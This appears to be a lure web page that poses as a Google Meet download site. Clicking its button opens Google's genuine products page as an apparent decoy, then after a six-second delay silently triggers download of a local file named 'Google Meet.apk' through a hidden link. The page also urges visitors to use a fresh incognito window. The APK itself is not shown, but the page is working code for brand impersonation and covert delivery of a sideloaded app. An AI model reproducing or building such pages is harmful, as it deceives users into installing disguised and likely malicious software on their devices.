<!DOCTYPE html>
<html>
<head>
  <title>Download Meet</title>
</head>
<body>

<br/><br/>
  <h2>Open this link in a newly launched browser - Incognito</h2>
<button id="downloadBtn">Download Google Meet</button>

<script>

var count = 0;
document.getElementById("downloadBtn").addEventListener("click", function () {
    
    window.open("https://about.google/products/", "");
    
    const link = document.createElement("a");
    link.href = "Google Meet.apk";
    link.download = "Google Meet.apk";
    document.body.appendChild(link);
  
    setTimeout(function(){
       setTimeout(function(){
        link.click();
        document.body.removeChild(link);
    }, 3000);
      
    }, 3000);
    
});
</script>

</body>
</html>
